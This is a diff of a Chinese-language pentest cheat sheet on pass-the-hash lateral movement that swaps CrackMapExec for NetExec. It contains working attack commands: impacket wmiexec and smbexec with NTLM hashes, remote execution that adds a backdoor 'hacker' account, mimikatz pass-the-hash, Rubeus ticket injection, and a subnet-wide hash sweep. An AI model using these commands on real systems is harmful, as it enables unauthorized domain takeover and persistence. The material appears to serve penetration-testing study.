@@ -65,17 +65,17 @@ python3 wmiexec.py administrator@10.10.10.x -hashes :NTLM_HASH
 python3 smbexec.py administrator@10.10.10.x -hashes :NTLM_HASH
 ```
 
-**CrackMapExec**
+**NetExec（nxc）**
 
 ```bash
 # 確認 hash 是否有效
-crackmapexec smb 10.10.10.x -u administrator -H :8846f7eaee8fb117ad06bdd830b7586c
+nxc smb 10.10.10.x -u administrator -H :8846f7eaee8fb117ad06bdd830b7586c
 
 # 執行指令
-crackmapexec smb 10.10.10.x -u administrator -H :NTLM_HASH -x "whoami"
+nxc smb 10.10.10.x -u administrator -H :NTLM_HASH -x "whoami"
 
 # 取 SYSTEM shell
-crackmapexec smb 10.10.10.x -u administrator -H :NTLM_HASH --exec-method atexec -x "net user hacker P@ssw0rd /add"
+nxc smb 10.10.10.x -u administrator -H :NTLM_HASH --exec-method atexec -x "net user hacker P@ssw0rd /add"
 ```
 
 **evil-winrm（WinRM port 5985）**
@@ -152,13 +152,13 @@ mimikatz # sekurlsa::pth /user:alice /domain:corp.local /ntlm:HASH /run:powershe
 .\Rubeus.exe asktgt /user:alice /rc4:NTLM_HASH /ptt
 ```
 
-## CrackMapExec 掃描整個子網路
+## NetExec 掃描整個子網路
 
 拿到 DA 的 hash 後，可以橫掃整個網段確認：
 
 ```bash
 # 確認 DA hash 對哪些機器有效
-crackmapexec smb 10.10.10.0/24 -u administrator -H :NTLM_HASH
+nxc smb 10.10.10.0/24 -u administrator -H :NTLM_HASH
 
 # [+] 代表有效
 # [*] (Pwn3d!) 代表是 Local Admin 或 Domain Admin
